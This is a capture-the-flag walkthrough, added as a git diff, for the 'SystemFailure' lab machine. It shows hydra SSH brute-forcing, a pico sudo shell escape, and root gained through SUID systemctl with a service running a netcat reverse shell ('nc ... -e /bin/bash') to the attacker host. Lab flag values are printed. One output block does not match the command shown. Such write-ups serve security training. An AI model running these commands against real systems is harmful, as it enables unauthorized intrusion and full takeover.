@@ -380,3 +380,227 @@ Systems Failure is a role-playing game written by Bill Coffin and published by P
 It seems a Base32 or Base64 encoding, but it is not, so I went to [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) and tryed all the baseXX encoding, ending up to BASE62
 
 ![base62](./System_Failure/base62.PNG "base62")
+
+#### Do you remember the 4 users we enumerate from smb?
+
+I put into a txt file and tried to use the "password" we docrypted into hydra adding also the option -e nsr, which test for null password, use the username as password and reverse the username and input as password.
+
+```bash
+┌──(root💀kali)-[/tmp/SystemFailure]
+└─# hydra -L users.txt -p /Sup3rS3cR37 192.168.1.109 ssh -t 4 -e nsr -I                                                                                           255 ⨯
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-14 09:40:18
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 16 login tries (l:4/p:4), ~4 tries per task
+[DATA] attacking ssh://192.168.1.109:22/
+[22][ssh] host: 192.168.1.109   login: valex   password: xelav
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-14 09:40:30
+```
+
+### WE HAVE BEEN LUCKY!!!!
+
+Let's connect via ssh to valex
+
+```bash
+┌──(root💀kali)-[/tmp/SystemFailure]
+└─# ssh valex@192.168.1.109
+valex@192.168.1.109's password:
+Linux SystemFailure 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jun  9 04:45:16 2021 from 192.168.1.200
+valex@SystemFailure:~$
+```
+
+**WE ARE IN!!**
+
+Do we have any sudo permission?
+
+```bash
+valex@SystemFailure:~$ sudo -l
+Matching Defaults entries for valex on SystemFailure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User valex may run the following commands on SystemFailure:
+    (jin) NOPASSWD: /usr/bin/pico
+valex@SystemFailure:~$
+```
+
+YES.. we can run pico and escalate the privileges to jin...
+
+Let's see first if there is a flag
+
+```bash
+valex@SystemFailure:~$ ls
+user.txt
+valex@SystemFailure:~$ cat user.txt
+1871828204892bc09be79e1a02607dbf
+```
+
+WE GOT IT!
+
+Now let's escalate the privileges to jin
+
+```bash
+valex@SystemFailure:~$ sudo -u jin /usr/bin/pico
+
+^R^X
+reset; sh 1>&0 2>&0
+```
+
+We got the shell as jin
+
+![jin](./System_Failure/jin.PNG "Jin")
+
+use /bin/bash to have a bash
+
+Next we move into jin's home and check what is in it
+
+```bash
+jin@SystemFailure:/home/valex$ cd
+jin@SystemFailure:~$ ls
+secret.txt  user2.txt
+```
+
+The second flag!!! Let's open it and then see wath the secret.txt is.
+
+```bash
+jin@SystemFailure:~$ cat user2.txt
+172c7b08a7507f08bab7694fd632839e
+jin@SystemFailure:~$ cat secret.txt
+Reminder: I had left something in /opt/system
+jin@SystemFailure:~$
+```
+
+Let's go in /opt/system and see what he left
+
+```bash
+jin@SystemFailure:~$ cd /opt/system/
+jin@SystemFailure:/opt/system$ ls
+reminder.txt
+jin@SystemFailure:/opt/system$ cat reminder.txt
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+System failure:
+```
+
+Let's check the sudo permission and the system commands
+
+```bash
+jin@SystemFailure:/opt/system$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for jin:
+jin@SystemFailure:/opt/system$ find / -perm -u=s 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/systemctl
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+jin@SystemFailure:/opt/system$
+```
+
+Jin user can run **systemctl**!!! So we get the root shell creating a service!!!
+
+```bash
+jin@SystemFailure:/opt/system$ echo '[Service]
+> Type=oneshot
+> ExecStart=nc 192.168.1.200 4444 -e /bin/bash
+> [Install]
+> WantedBy=multi-user.target' > $TF
+bash: $TF: ambiguous redirect
+jin@SystemFailure:/opt/system$ echo '[Service]
+Type=oneshot
+ExecStart=nc 192.168.1.200 4444 -e /bin/bash
+[Install]
+WantedBy=multi-user.target' > test.service
+jin@SystemFailure:/opt/system$ ls
+reminder.txt  test.service
+Created symlink /etc/systemd/system/tmp.noEJj88ESX.service → /opt/.service.
+```
+
+Open a new terminal, without closing the connection with Jin, and run
+
+```bash
+┌──(root💀kali)-[/tmp/SystemFailure]
+└─# nc -lvp 4444
+listening on [any] 4444 ...
+```
+
+Now we go back to jin and run the service.
+
+```bash
+jin@SystemFailure:/opt/system$  /usr/bin/systemctl start test.service
+```
+
+### BOOM !!!!
+
+We got our reverse shell
+
+```bash
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### 1 flag left
+
+```bash
+export TERM=xterm
+python -c "import pty;pty.spawn('/bin/bash')"
+root@SystemFailure:/root# ls
+ls
+root.txt
+root@SystemFailure:/root# cat ro
+cat root.txt
+If you are reading this flag, without being rooted, it is not valid. You must enter after send me a picture you entered jin, and tag me. Good luck.
+root@SystemFailure:/root#
+```
+
+## DONE
